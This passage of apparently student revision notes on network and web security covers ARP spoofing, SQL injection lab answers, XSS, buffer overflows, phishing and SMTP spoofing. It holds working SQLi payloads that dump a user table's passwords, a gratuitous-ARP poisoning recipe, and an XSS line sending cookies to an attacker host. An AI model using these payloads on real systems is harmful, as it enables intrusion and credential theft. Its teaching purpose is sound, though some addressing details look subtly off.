        *   Assuming B has communicated with A and its gateway (R1), and R1's eth0 has communicated with A, B, and C.
        *   **Machine B's ARP Table (192.168.1.2):**
            *   `192.168.1.1 -> AA:..:AA` (Host A)
            *   `192.168.1.255 -> R10:..:R10` (Router R1 eth0 - gateway)
        *   **Router R1's ARP Table (for eth0 interface 192.168.1.255):**
            *   `192.168.1.1 -> AA:..:AA` (Host A)
            *   `192.168.1.2 -> BB:..:BB` (Host B)
            *   `192.168.1.3 -> CC:..:CC` (Host C)
    *   **h. Q6: Give the steps machine C must take to realize the attack (e.g., to intercept traffic from A to B, C makes A believe B's IP has C's MAC)? The exam question specified a *gratuitous ARP request*.**
        *   To make Host A (192.168.1.1) send traffic intended for Host B (192.168.1.2) to Host C (192.168.1.3, MAC CC:..:CC):
        *   Host C sends a gratuitous ARP *request* packet with the following fields:
            *   **Ethernet Frame:**
                *   Source MAC: `CC:..:CC` (C's MAC)
                *   Destination MAC: `FF:FF:FF:FF:FF:FF` (Broadcast)
                *   EtherType: `0x0806` (ARP)
            *   **ARP Payload:**
                *   Opcode: `1` (Request)
                *   Sender MAC Address: `CC:..:CC` (C's MAC)
                *   Sender IP Address: `192.168.1.2` (B's IP - C is falsely claiming this IP)
                *   Target MAC Address: `00:00:00:00:00:00` (Typical for a request asking "who has")
                *   Target IP Address: `192.168.1.2` (The IP C is asking about, which is B's IP)
        *   When Host A receives this, it updates its ARP cache with the Sender IP -> Sender MAC mapping: `192.168.1.2 -> CC:..:CC`.
        *   (To intercept full duplex A <-> B, C would also send a similar gratuitous ARP to B, claiming A's IP: Sender MAC `CC:..:CC`, Sender IP `192.168.1.1`, Target IP `192.168.1.1`).
    *   **i. Q7: Once the attack is complete (C intercepts A to B traffic, and B to A traffic), describe the state of the ARP tables of A, B, R1 (eth0), and C.**
        *   **Host A's ARP Table (192.168.1.1):**
            *   `192.168.1.2 -> CC:..:CC` (Poisoned: thinks B is at C's MAC)
            *   `192.168.1.255 -> R10:..:R10` (Router R1 eth0)
        *   **Host B's ARP Table (192.168.1.2):**
            *   `192.168.1.1 -> CC:..:CC` (Poisoned: thinks A is at C's MAC)
            *   `192.168.1.255 -> R10:..:R10` (Router R1 eth0)
        *   **Router R1's ARP Table (for eth0 interface 192.168.1.255):** (Assuming C only targeted A-B traffic and not R1)
            *   `192.168.1.1 -> AA:..:AA`
            *   `192.168.1.2 -> BB:..:BB`
            *   `192.168.1.3 -> CC:..:CC`
        *   **Host C's ARP Table (192.168.1.3):** (C needs correct mappings to forward traffic)
            *   `192.168.1.1 -> AA:..:AA` (Host A's real MAC)
            *   `192.168.1.2 -> BB:..:BB` (Host B's real MAC)
            *   `192.168.1.255 -> R10:..:R10` (Router R1 eth0)

## VII. Web Application Attacks

### A. SQL Injection (SQLi) (Slides 49-51 of full deck, matching slides 45-47 from `SQL Injections.md` source)

1.  **Overview** (Slide 49 / File 5 Slide 45)
    *   **Prevalence:** Arguably the **most widespread vulnerability** affecting web applications.
    *   **Target:** The vulnerability lies within the **web application's code**, not the database system itself.
    *   **Definition:** SQL Injection exploits the lack of input data validation, allowing an attacker to send crafted input that manipulates SQL commands.
    *   **Core Problem:** Lack of clear distinction between control plane (SQL instructions) and data plane (user-provided data).
    *   **Vulnerability Condition:** Without strict control/sanitization, input might be interpreted as SQL instructions.

2.  **The SQL Injection Mechanism** (Slides 49-51 / File 5 Slides 45-47)
    *   **a. Normal Operation (Example based on Slide 50 login):**
        User enters credentials (`srinivas`, `mypassword`). App forms SQL: `SELECT * FROM Users WHERE user_id = 'srinivas' AND password = 'mypassword';`. DB executes.
    *   **b. Attack Scenario (Example based on Slide 50 bypass):**
        Attacker: User-Id: `' OR 1=1; /*`, Password: `*/--`. App forms SQL: `SELECT * FROM Users WHERE user_id = '' OR 1=1; /*' AND password = '*/--';`.
        `' OR 1=1` is always true. `/*` comments out rest. Attacker logs in.
    *   **c. Attack Flow (General Steps, based on Slide 51):**
        1.  App provides form.
        2.  Attacker submits malicious input.
        3.  App server incorporates input into SQL query.
        4.  DBMS executes manipulated query, returns results to app server.
        5.  App displays results to attacker.
    *   **d. Demonstration Context (Slide 50):**
        Client (user/attacker) <-> Level 2 (Application Server) <-> Level 3 (Database Server).

    <!-- Placeholder for SQL Injection Flow Diagram (Slide 51) -->

3.  **SQL Injection Lab Exercise (Based on Exam Paper TD N°3, Exercice 01 & File 5.1)**
    *   **a. Scenario & Vulnerable Query:**
        *   URL: `https://insecure-website.com/products?category=Gifts`
        *   Server-side SQL (conceptual):
            ```sql
            SELECT id, nom, category, price
            FROM products
            WHERE category = '<userInputFromCategoryParam>' AND released = 1;
            ```
    *   **b. Q1 – Confirming Vulnerability (Comment vérifier que le site est vulnérable):**
        *   **Method:** Induce a syntax error with an unmatched quote.
        *   **Payload:** `Gifts'`
        *   **Test URL:** `https://insecure-website.com/products?category=Gifts'`
        *   **Expected Outcome:** A database error message (or broken page) confirms unescaped input reaches the SQL engine. The query becomes `... WHERE category = 'Gifts'' AND released = 1`, which is invalid SQL.
    *   **c. Q2 – Displaying All Products (Construire une attaque qui permet d'afficher tous les produits):**
        *   **Objective:** Bypass both the category filter and the `AND released = 1` check.
        *   **Technique:** Use a tautology (`' OR '1'='1'`) and a comment (`-- `) to neutralize the rest of the query.
        *   **Payload:** `' OR '1'='1 -- ` (Note the trailing space for the comment)
        *   **Encoded URL:** `https://insecure-website.com/products?category=%27%20OR%20%271%27%3D%271%20--%20`
        *   **Resulting SQL:**
            ```sql
            SELECT id, nom, category, price
            FROM products
            WHERE category = '' OR '1'='1' -- ' AND released = 1;
            ```
            The `WHERE` clause effectively becomes `TRUE`, and `AND released = 1` is commented out.
        *   **Impact:** All rows in `products` are returned.
    *   **d. Q3 – Injection Type / Significance of Displayed Results (Les résultats ... sont renvoyés et affichés):**
        *   **Observation:** The application returns query results directly in its HTTP response.
        *   **Conclusion:** This signifies **In-Band SQL Injection**. The attacker retrieves data via the same channel used to inject the payload.
    *   **e. Q4 – Extracting the `user` Table (Construire une attaque pour récupérer les données de la table user):**
        *   **Objective:** Retrieve `id, name, utilisateur, password, type_account, date` from the `user` table.
        *   **Method:** `UNION SELECT`. The original query selects 4 columns (`id, nom, category, price`). The `UNION SELECT` must also have 4 columns with compatible data types.
        *   Let's pick 4 columns from `user` table: `id, name, password, type_account`. (Assuming `utilisateur` is the username, and `name` is perhaps full name. The problem lists `name, utilisateur, password` - so let's use 3 of those and one `id` to make 4 columns.)
        *   **Payload (example using 4 columns):** `' UNION SELECT id, name, password, type_account FROM user -- `
        *   If we need to match specific names from the problem: `id, name, utilisateur, password`.
        *   **Payload:** `' UNION SELECT id, name, utilisateur, password FROM user -- `
        *   **Encoded URL:** `...products?category=%27%20UNION%20SELECT%20id%2C%20name%2C%20utilisateur%2C%20password%20FROM%20user%20--%20`
        *   **Combined SQL:**
            ```sql
            SELECT id, nom, category, price
            FROM products
            WHERE category = '' -- This part might return no results for category=''
            UNION
            SELECT id, name, utilisateur, password -- These values will be displayed
            FROM user; -- ' AND released = 1; is commented out
            ```
        *   **Outcome:** The response will include rows from `user` table, mapped to the display columns of the `products` table (e.g., `user.password` might appear where `product.price` usually is).
    *   **f. Meaning of `released = 1`:**
        *   `released` is likely a column in the `products` table (e.g., a boolean or integer).
        *   `released = 1` acts as a filter to only show products that are marked as "published" or "active" (where 1 means TRUE).
        *   The SQLi attacks in Q2 and Q4 (using `-- `) bypass this filter.

4.  **Mitigation & Best Practices (SQLi)**
    *   **Use parameterized queries (prepared statements)** to enforce a strict separation between code and data. This is the primary defense.
    *   **Whitelist input validation:** Reject any characters or patterns that do not conform to expected values.
    *   **Principle of least privilege:** Limit the database account’s permissions to only what the application truly needs.
    *   **Regular security testing** (automated scans, code reviews, penetration tests).
    *   **Web Application Firewall (WAF)** as an additional layer, not a primary defense.

5.  **Opinion on SQLi Defenses (from File 5.1)**
    > Relying on anything other than properly parameterized queries is a risky gamble. All other measures—firewalls, regex filters, manual sanitization—can be bypassed or misconfigured. The only reliable protection against SQLi is to treat user input strictly as data, never as executable SQL.

### B. Cross-Site Scripting (XSS) (Slides 52-56)

1.  **Definition and Goal** (Slide 52)
    *   **Definition:** XSS involves injecting arbitrary client-side code (usually JavaScript) into a web application, which is then executed in a victim's browser.
    *   The vulnerability lies in the application including user-supplied data in its output without proper validation or encoding.
    *   **Goal:** Steal sensitive information from the user's session, such as cookies, session tokens, credentials, or perform actions on behalf of the user.

2.  **Problematic: Unvalidated Input** (Slide 52)
    *   The attack is possible when a web server or application does not validate data provided by users/visitors (e.g., URL parameters, form content) and sends it back to other users without filtering or encoding.

3.  **Main Types** (Slide 52)
    *   **Reflected XSS (Non-permanent):** The malicious script is embedded in a URL or other request data and is reflected back by the server to the victim's browser, which then executes it. (Slide 53)
    *   **Stored XSS (Permanent):** The malicious script is permanently stored on the target server (e.g., in a database, message forum, comment field). When other users access the page containing the stored script, their browser executes it. (Slide 54)

4.  **Examples/Demonstrations (from slides)**
    *   **Reflected XSS Example (Slide 53):**
        *   Victim clicks a crafted link like `https://banque.com/?search=<script>alert(1)</script>`.
        *   The server includes the `<script>alert(1)</script>` in the search results page.
        *   The victim's browser executes the script.
        *   A more malicious example shown: `https://banque.com/?search=<script>var i = new Image; i.src="http://site-attacker.com/"+document.cookie;</script>` (steals cookie).
    *   **Stored XSS Example (Slide 54):**
        *   Attacker injects malicious script (e.g., `<script>alert(1)</script>`) into a comment field on a vulnerable site.
        *   The script is stored by the server.
        *   When other users view the page with that comment, the script executes in their browsers.
    *   **Demonstration Screenshots (Slides 55-56):** These slides show practical examples of XSS payloads in a web security academy lab, one for reflected XSS (search parameter) and one for stored XSS (comment field).

## VIII. Application Attacks (System Level)

### A. Buffer Overflow (Slides 58-62)

1.  **Definition (Buffer, Overflow, Flaw)** (Slide 58)
    *   **Buffer:** A contiguous region of memory used to hold data.
    *   **Overflow:** Exceeding the allocated space.
    *   **The Flaw:** Copying data into a buffer without verifying if the data's size exceeds the buffer's capacity.
    *   **Mechanism:** A bug where a process, while writing to a buffer, writes data beyond the buffer's boundaries, overwriting adjacent memory areas. This can corrupt data, crash the program, or, critically, overwrite control information like return addresses on the stack.
    *   **Goal:** To execute arbitrary instructions (injected code) by hijacking the program's execution flow.

2.  **Vulnerable C Functions vs. Secure Alternatives** (Slide 59)
    *   **Vulnerable Functions:**
        *   `gets()`: No bounds checking. Extremely dangerous.
        *   `strcpy()`: No bounds checking.
        *   `strcat()`: No bounds checking.
        *   `sprintf()`: Can write more data than buffer holds if format string is manipulated.
    *   **Secure Alternatives:**
        *   `fgets()`: Reads up to a specified number of characters, preventing overflow.
        *   `strncpy()`: Copies up to n characters, can prevent overflow if n is buffer size.
        *   `strncat()`: Appends up to n characters.
        *   `snprintf()`: Writes at most n characters to the output string.

3.  **Memory Structure Overview** (Slide 60)
    A typical process memory layout includes:
    *   **Text Segment:** Executable instructions (code).
    *   **Data Segment:** Initialized global and static variables.
    *   **BSS Segment:** Uninitialized global and static variables.
    *   **Heap:** Dynamically allocated memory (e.g., via `malloc()`). Grows upwards.
    *   **Stack:** Local variables, function arguments, return addresses. Grows downwards (on most architectures).
    The slide also shows CPU registers, data/address buses connecting to memory.

4.  **Stack Structure and Overflow Mechanics** (Slide 61)
    *   The stack is organized into **frames**, one for each active function call.
    *   A stack frame typically contains: function arguments, return address (to caller), saved frame pointer (EBP), local variables, and buffers.
    *   When a buffer allocated on the stack is overflowed, data written past its end can overwrite other local variables, the saved EBP, and crucially, the **return address**.
    *   By overwriting the return address with the address of injected malicious code (shellcode), an attacker can redirect execution flow when the function returns.

5.  **Injection of Malicious Code** (Slide 62)
    *   The attacker crafts an input that includes:
        *   Padding to fill the buffer.
        *   The address of the shellcode (to overwrite the return address).
        *   The shellcode itself (often placed within the overflowing buffer or another controlled memory location).
    *   When the vulnerable function returns, instead of returning to the legitimate caller, it "returns" to (jumps to) the attacker's shellcode, executing it with the privileges of the compromised program.

## IX. Social Engineering (Slides 63-71)

### A. Definition and Principles (Slide 63)
*   **Definition:** Social engineering is a non-technical intrusion technique that relies heavily on human interaction and often involves tricking people into breaking normal security procedures. It's described as the "simplest hacking method" that may not require any technical competence.
*   "There is no patch for human stupidity."
*   Exploits human nature (e.g., desire to be helpful, trust, fear, curiosity) and behavior.
*   Humans are often the weakest link in security.
*   **Objective:** To convince or manipulate someone into performing actions or divulging confidential information.

### B. Attack Vectors (Slide 64)
*   **Human-Based:**
    *   **Eavesdropping:** Listening to private conversations.
    *   **Shoulder Surfing:** Observing someone entering credentials or sensitive data.
    *   **Dumpster Diving:** Sifting through trash for valuable information.
    *   **Piggybacking/Tailgating:** Following an authorized person into a restricted area.
*   **Computer-Based (often leveraging human psychology):**
    *   **Phishing:** Broad email scams.
    *   **Spear Phishing:** Targeted phishing.
    *   **Smishing:** Phishing via SMS.
    *   **Vishing:** Phishing via voice calls.
    *   **Hoax:** False warnings or chain letters.
    *   **Popup:** Malicious pop-up windows.
    *   **Chat:** Using chat applications to deceive.

### C. Phishing (Slides 65-67)

1.  **General (Slide 65)**
    *   A fraudulent technique to lure internet users into communicating personal data (login credentials, passwords, banking details) by impersonating a trusted third party.
    *   Most phishing attacks are conducted via mass email campaigns.
    *   Often impersonate popular social media sites, auction sites, online payment processors, or IT administrators.

2.  **Techniques (Slide 65)**
    *   **Mass Spam Emails:** Sending out large volumes of deceptive emails.
    *   **Website Cloning:** Creating convincing replicas of legitimate websites.
    *   **URL Manipulation:** Using similar-looking domain names (typosquatting), subdomains, or hiding the true URL.
        *   Subdomains & Misspelled: `google.com.stationx.net`, `rnicrosoft.com`
        *   IDN Homograph Attack: `g00gle.com` (using zeros instead of 'o')
        *   Hidden URLs: `Click Here` linking to `https://www.google.com/` (but could be `google.com.stationx.net` in reality).
    *   **Phishing by Site Cloning (Slide 66):** Shows an example of a fake Facebook login page hosted on a malicious domain (`facebook.com.mine`).
    *   **Phishing by SPAM (Slide 67):** Shows an example of a fake Apple order confirmation email with a malicious attachment.

### D. Spear Phishing and Whaling (Slide 68)
*   **Spear Phishing:** A targeted phishing campaign aimed at a specific individual, organization, or group. The email is often personalized and may contain information specific to the target to appear more legitimate.
*   **Whaling:** A form of spear phishing specifically targeting high-profile individuals such as executives (CEOs, CFOs), administrators, or wealthy clients. These attacks often require more research and planning by the attacker.

### E. Smishing and Vishing (Slide 69)
*   **Smishing:** Phishing attacks conducted via SMS (Short Message Service). Users receive text messages that attempt to trick them into clicking malicious links or divulging information.
*   **Vishing:** Phishing attacks conducted over voice channels (Voice + Phishing). This can be through traditional phone lines, VoIP services, or mobile phones. Attackers may use fake caller IDs (spoofing) to appear legitimate. SpIT (Spam over Internet Telephony) is a related term.

### F. Spam (Slides 70-71)

1.  **Definition and Issues (Slide 70)**
    *   Spam (or "pourriel" in French) is unsolicited and/or unwanted electronic mail.
    *   It's not just advertising; it can include malicious content and attack vectors.
    *   Often used as a vector for social engineering attacks.
    *   **Problems caused by spam:**
        *   Can contain malware (viruses, logic bombs, ransomware, Trojans).
        *   Can carry social engineering attacks (phishing, hoaxes).
        *   Wastes time and internet resources (storage, processing cycles, bandwidth).
    *   **Key advice:** "Il ne faut jamais répondre à un spam" (Never reply to spam).

2.  **Email Spoofing (Concept and SMTP Demo) (Slide 71)**
    *   **Email Structure:**
        *   **Envelope:** `MAIL FROM: <sender@example.com>`, `RCPT TO: <recipient@example.com>` (used by mail servers for routing).
        *   **Header (En-tête):** `From:`, `To:`, `Reply-To:`, `Date:`, `Subject:` (displayed to the user, can be easily forged).
        *   **Body (Corps):** The message content.
    *   **Email Spoofing:** Forging the sender address in the email header (`From:` field) to make the email appear as if it originated from someone other than the actual sender.
    *   **SMTP Demonstration (Slide 71):**
        *   **Legitimate Email (`Commande SMTP pour envoyer un email sain`):** Shows basic SMTP commands (`HELO`, `MAIL FROM`, `RCPT TO`, `DATA`, then headers and body).
        *   **Spoofed Email (`Commande SMTP pour envoyer un email usurpé`):** Shows how the `From:` header can be set to an arbitrary value (`From: Boss <boss@server.com>`) while the actual envelope sender (`MAIL FROM:`) might be different. The `Reply-To:` header can also be forged to direct replies to the attacker.

